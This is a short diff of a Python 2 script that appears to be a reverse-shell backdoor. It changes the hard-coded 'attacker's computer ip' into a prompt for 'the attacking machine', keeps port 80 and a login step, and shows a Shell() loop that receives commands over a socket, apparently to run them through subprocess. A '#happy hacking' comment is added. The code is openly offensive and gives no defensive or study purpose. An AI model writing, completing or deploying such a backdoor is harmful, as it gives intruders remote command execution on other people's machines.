@@ -11,10 +11,14 @@ import os
 import subprocess # processing of the commands
 
 
-hostip = "127.0.0.1" # attacker's computer ip (Taken local system's ip for testing can be modified as required)
+# hostip = "127.0.0.1" # attacker's computer ip (Taken local system's ip for testing can be modified as required)
 
-port = 80 
+hostip = raw_input("enter as the ip address of the attacking machine")
+
+port = 80
+
 #password = 1234
+
 
 
 def Login():
@@ -33,6 +37,7 @@ def Login():
 		
 # function to execute the shell commands 
 
+#happy hacking
 def Shell():		
 	while True:
 		data = ob.recv(1024)
